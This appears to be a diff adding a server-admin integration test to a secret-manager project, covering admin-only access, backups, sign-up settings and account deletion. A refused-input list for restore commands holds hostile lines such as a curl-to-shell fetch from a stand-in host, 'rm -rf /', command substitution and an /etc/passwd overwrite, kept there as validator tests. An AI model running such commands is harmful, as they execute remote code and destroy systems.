@@ -32,7 +32,8 @@ from cryptography.exceptions import InvalidTag  # noqa: E402
 from secretbroker import platform, teams  # noqa: E402
 from secretbroker.service import AI_OPS, TEAM_CHANGE_OPS, Service  # noqa: E402
 from secretbroker_server import config, mail  # noqa: E402
-from secretbroker_server.web import create_app  # noqa: E402
+sys.path.insert(0, str(Path(__file__).resolve().parent))
+from fake_admin import create_app  # noqa: E402 - the real server, plus its admin pages if this tree has none yet
 
 OUTBOX = []
 mail.deliver = lambda settings, msg: OUTBOX.append(msg)  # what the server would e-mail
@@ -547,6 +548,8 @@ class FakeApi:
             from secretbroker_server import config as server_config
             return {"name": "fake", "version": "0.17.0", "api": server_config.API_VERSION, "min_client": "0.16.0",
                     "signups": "open", "verification": "off", "mail": False}
+        if method == "GET" and path == "/me":  # asked once by an account linked before server admins (5.2)
+            return {"user": {"verified": True, "admin": False}, "devices": []}
         return self.routes(method, path, body)
 
 
@@ -1223,6 +1226,177 @@ def disabled_account(base, settings, alice, oid, cid, code):
     check(response["code"] == "account_disabled", "and she can't sign in again")
 
 
+def server_admin(base, settings, alice, carol, oid, c5):
+    """The server admin («Servidor» in Equipo, 5.2): reads, changes with one click, refusals with their fix, and
+    nobody else gets in. Against the real server's admin pages, or tests/fake_admin.py on the server's own functions
+    while this tree's server has none."""
+    print("The team server's admin, from the app")
+    from secretbroker import i18n
+    alice_id = alice.service.vault.team()["user"]["id"]
+    check(alice.ok("team_status")["server_admin"] is True and carol.ok("team_status")["server_admin"] is False,
+          "the first account of an open server is its admin; the others are not")
+    check(carol.ok("team_overview")["admin"] is None, "a non-admin's Equipo view has no «Servidor» data")
+    response = carol.call("team_admin_overview")
+    check(response["code"] == "forbidden" and response["error"] == i18n.tr("teams.admin_only"),
+          "a non-admin's app refuses the admin reads")
+    response = carol.call("team_admin_disable", user_id=alice_id, proof={"kind": "presence", "token": carol.presence})
+    check(response["code"] == "forbidden", "and the admin changes")
+    state = carol.service.vault.team()
+    state["user"]["admin"] = True  # a tampered (or stale) app: the server still says no
+    carol.service.vault.set_team(state)
+    try:
+        response = carol.call("team_admin_users")
+        changed = carol.call("team_admin_settings", signups="closed", proof={"kind": "presence", "token": carol.presence})
+    finally:
+        state["user"]["admin"] = False
+        carol.service.vault.set_team(state)
+    check(response["code"] == "forbidden" and response["error"] == i18n.tr("teams.admin_only")
+          and changed["code"] == "forbidden" and settings.signups == "open",
+          f"the server refuses a non-admin, said in the app's words ({response.get('error')})")
+
+    overview = alice.ok("team_admin_overview")
+    check(overview["version"] and overview["signups"] == "open" and overview["mail"] is True
+          and overview["counts"]["users"] >= 3 and overview["restore"] == "cli",
+          "the admin reads the overview: version, sign-ups, e-mail, counts")
+    check(overview["install"] == "systemd" and overview["restore_command"]
+          and any("<file>" in line for line in overview["restore_command"]),
+          "with how the server is installed and its own restore commands")
+    accepted = (["sudo secretbroker-server restore /var/lib/secretbroker-server/backups/<file>"],
+                ["secretbroker-server restore /backups/<file>"],
+                ["sudo systemctl stop secretbroker-server", "sudo /opt/sb/bin/secretbroker-server restore /var/b/<file>",
+                 "sudo systemctl start secretbroker-server"],
+                ["sudo docker compose stop server backup",
+                 "sudo docker compose run --rm --no-deps backup secretbroker-server restore /backups/<file>"])
+    refused = (["sudo -s"], ["sudo bash"], ["sudo -s secretbroker-server restore <file>"],
+               ["sudo -u root secretbroker-server restore <file>"], ["sudo bash -c secretbroker-server restore <file>"],
+               ["sudo secretbroker-server restore /backups/<file>; rm -rf /"], ["sudo secretbroker-server restore <file> && id"],
+               ["sudo secretbroker-server restore $(id)/<file>"], ["sudo secretbroker-server restore `id`<file>"],
+               ["sudo secretbroker-server restore <file> | sh"], ["curl https://evil.example/x.sh | sh"],
+               ["sudo secretbroker-server restore ../../etc/<file>"], ["sudo  secretbroker-server restore <file>"],
+               ["sudo systemctl stop secretbroker-server"], ["echo <file> > /etc/passwd"],
+               ["sudo secretbroker-server restore <file> <file>"], "sudo secretbroker-server restore <file>", [1])
+    check(all(teams.restore_lines(lines) == lines for lines in accepted) and all(teams.restore_lines(bad) is None for bad in refused),
+          "the server's restore commands are kept only as plain lines, a bare «sudo» at most (they get pasted into a root shell)")
+    users = {u["email"]: u for u in alice.ok("team_admin_users")}
+    check(users["alice@example.com"]["me"] and users["alice@example.com"]["admin"]
+          and any(o["name"] == "Acme" for o in users["carol@example.com"]["orgs"]), "the accounts, with their organizations")
+    orgs = alice.ok("team_admin_orgs")
+    check(any(o["name"] == "Acme" and any(w["id"] == alice_id for w in o["owners"]) for o in orgs),
+          "the organizations, with their owners")
+    cached = alice.ok("team_overview")["admin"]
+    check(cached["overview"]["version"] == overview["version"] and len(cached["users"]) == len(users),
+          "and it is kept on this PC, so the tab draws at once next time")
+    with alice.service._team_lock:  # a sync running: the admin's reads don't wait for it
+        started = time.monotonic()
+        check(alice.call("team_admin_orgs")["ok"] and time.monotonic() - started < 5, "admin reads don't take the team lock")
+
+    response = alice.call("team_admin_backup_now")
+    check(response["code"] == "proof_required", "making a backup needs the user (one click)")
+    made = alice.act("team_admin_backup_now")
+    backups = alice.ok("team_admin_backups")
+    check(made["file"] and backups and backups[0]["file"] == made["file"]
+          and alice.ok("team_admin_overview")["backups"]["count"] == len(backups), "«Hacer copia ahora» makes one, listed")
+
+    alice.act("team_admin_settings", signups="invite", auto_update=False)
+    overview = alice.ok("team_admin_overview")
+    check(overview["signups"] == "invite" and overview["updates"]["auto"] is False,
+          "sign-ups by invitation only and automatic updates off, with one click each")
+    response = alice.call("team_admin_settings", signups="everyone", proof={"kind": "presence", "token": alice.presence})
+    check(response["code"] == "invalid" and "." in response["error"], "an unknown sign-up mode is refused")
+    frank = Person("frank")
+    response = frank.call("team_connect", server_url=base, email="frank@example.com", password=ACCOUNT, mode="register",
+                          name="Frank", proof={"kind": "presence", "token": frank.presence})
+    check(response["code"] == "invite_required", "now nobody signs up without a code")
+    token = alice.act("team_admin_signup_token", days=3)
+    check(token["token"] and token["expires"], "«Crear código de registro» gives a single-use code")
+    frank.act("team_connect", server_url=base, email="frank@example.com", password=ACCOUNT, mode="register",
+              name="Frank", invite_token=token["token"])
+    alice.act("team_admin_settings", signups="open", auto_update=True)
+    check(settings.signups == "open", "and sign-ups open again")
+    frank_id = frank.service.vault.team()["user"]["id"]
+    row = next(u for u in alice.ok("team_admin_users") if u["id"] == frank_id)
+    check(row["verified"] is False and not row["orgs"], "Frank's account, not verified yet")
+    response = alice.call("team_admin_verify", user_id=frank_id)
+    check(response["code"] == "proof_required", "verifying someone's e-mail is one click")
+    alice.act("team_admin_verify", user_id=frank_id)
+    frank.sync()
+    check(frank.ok("team_status")["verified"], "the admin verifies it, and Frank's app learns it at its next sync")
+
+    # Frank owns an organization and alone manages a collection in it, and can read a collection of Acme.
+    frank_org = frank.act("team_create_org", name="Frank SL")["id"]
+    frankie = frank.act("team_create_collection", org=frank_org, name="Frankie")["id"]
+    frank.act("team_invite", org=frank_org, email="carol@example.com", role="member")
+    carol.act("team_accept_invite", id=next(i["id"] for i in carol.ok("team_invites") if i["org_id"] == frank_org))
+    carol_id = carol.service.vault.team()["user"]["id"]
+    frank.act("team_confirm_member", org=frank_org, user_id=carol_id)
+    alice.act("team_invite", org=oid, email="frank@example.com", role="member")
+    frank.act("team_accept_invite", id=next(i["id"] for i in frank.ok("team_invites") if i["org_id"] == oid))
+    alice.act("team_confirm_member", org=oid, user_id=frank_id)
+    alice.act("team_grant", collection=c5, user_id=frank_id, permission="view")
+    frank.sync()
+    check(frank.entry("five-api")["fields"]["value"] == "five-FAKE-1", "Frank reads «Cinco»")
+
+    for op in ("team_admin_disable", "team_admin_delete"):
+        response = alice.call(op, user_id=alice_id, proof={"kind": "presence", "token": alice.presence})
+        check(response["code"] == "invalid" and "." in response["error"], f"{op}: never the admin's own account")
+    alice.ok("team_admin_users")  # the names the answers use
+    alice.ok("team_admin_orgs")
+    with i18n.using("en"):
+        refused = alice.act("team_admin_delete", user_id=frank_id)
+    check(not refused["deleted"] and refused["code"] == "last_owner" and refused["orgs"] == [{"id": frank_org, "name": "Frank SL"}]
+          and refused["error"] == "Frank is the only owner of “Frank SL”: make someone else owner before deleting the account.",
+          f"deleting the only owner of an organization says so in one sentence, with the organization to fix ({refused.get('error')})")
+    alice.act("team_admin_transfer_owner", org=frank_org, user_id=carol_id)
+    check(next(m for m in carol.ok("team_members", org=frank_org) if m["user_id"] == carol_id)["role"] == "owner",
+          "«Hazle propietario a…» makes Carol owner of Frank SL")
+    response = alice.call("team_admin_transfer_owner", org=frank_org, user_id="not-an-id",
+                          proof={"kind": "presence", "token": alice.presence})
+    check(response["code"] == "not_found", "an id that isn't one is not sent to the server")
+    refused = alice.act("team_admin_delete", user_id=frank_id)
+    check(not refused["deleted"] and refused["code"] == "last_manager" and [c["id"] for c in refused["collections"]] == [frankie]
+          and refused["collections"][0]["name"] is None and "Frank" in refused["error"] and frankie not in refused["error"],
+          f"then: the only manager of a collection (its name is encrypted: Alice isn't in it) ({refused['error']})")
+    frank.act("team_grant", collection=frankie, user_id=carol_id, permission="manage")
+
+    before = alice.service.vault.team()["collections"][c5]["key_version"]
+    disabled = alice.act("team_admin_disable", user_id=frank_id)
+    check(disabled["person"] == "Frank" and {r["name"] for r in disabled["left"]} == {"Acme", "Frank SL"},
+          f"«Desactivar»: Frank leaves his teams ({disabled['left']})")
+    result = alice.sync()["result"]
+    check({"collection": "Cinco", "people": ["Frank"]} in result["rotate"]
+          and alice.service.vault.team()["collections"][c5]["key_version"] == before + 1,
+          "the manager's app re-encrypts what he could read")
+    reminder = next((r for r in alice.ok("reminders") if r["id"] == "five-api"), {})
+    check("Frank" in reminder.get("people", []), "and flags it: «rotate: Frank had access»")
+    row = next(u for u in alice.ok("team_admin_users") if u["id"] == frank_id)
+    check(row["disabled"] and not row["orgs"], "the account shows as disabled, in no organization")
+    check(frank.sync()["state"] == "reconnect", "his sessions are closed")
+    response = frank.call("team_connect", server_url=base, email="frank@example.com", password=ACCOUNT, mode="login",
+                          proof={"kind": "presence", "token": frank.presence})
+    check(response["code"] == "account_disabled", "and he can't sign in")
+    alice.act("team_admin_enable", user_id=frank_id)
+    frank.act("team_connect", server_url=base, email="frank@example.com", password=ACCOUNT, mode="login")
+    check(frank.sync()["state"] == "ok", "«Reactivar»: he can sign in again (in no team until invited)")
+    deleted = alice.act("team_admin_delete", user_id=frank_id)
+    check(deleted == {"deleted": True, "person": "Frank"} and not any(u["id"] == frank_id for u in alice.ok("team_admin_users")),
+          "«Borrar» deletes the account once nothing depends on it")
+    actions = [e["action"] for e in alice.ok("team_admin_events")]
+    check({"user.disable", "user.enable", "user.delete"} <= set(actions), f"«Registro»: what the admin did ({actions[:6]})")
+
+    print("The admin after opening with the Windows session")
+    token = alice.ok("enable_session_unlock", proof={"kind": "master_password", "value": MASTER})["token"]
+    alice.ok("lock")
+    weak = alice.ok("unlock", proof={"kind": "session", "token": token})["presence"]
+    check(alice.call("team_admin_overview")["ok"], "reading needs nothing")
+    check(alice.call("team_admin_settings", auto_update=True, proof={"kind": "presence", "token": weak})["ok"],
+          "a setting is one click")
+    response = alice.call("team_admin_signup_token", proof={"kind": "presence", "token": weak})
+    check(response["code"] == "proof_required", "a sign-up code asks for Hello or the password once")
+    alice.presence = alice.ok("team_admin_signup_token", proof={"kind": "master_password", "value": MASTER,
+                                                                 "presence": weak})["presence"]
+    alice.ok("disable_session_unlock")
+
+
 def version_checks(base, alice):
     print("App and server versions")
     from secretbroker import __version__
@@ -1880,6 +2054,7 @@ def main():
     server_texts()
     erin_code = invite_lifecycle(alice, oid, settings)
     disabled_account(base, settings, alice, oid, c5, erin_code)
+    server_admin(base, settings, alice, carol, oid, c5)
     version_checks(base, alice)
 
     db = b"".join(p.read_bytes() for p in Path(settings.data_dir).glob("secretbroker.db*"))
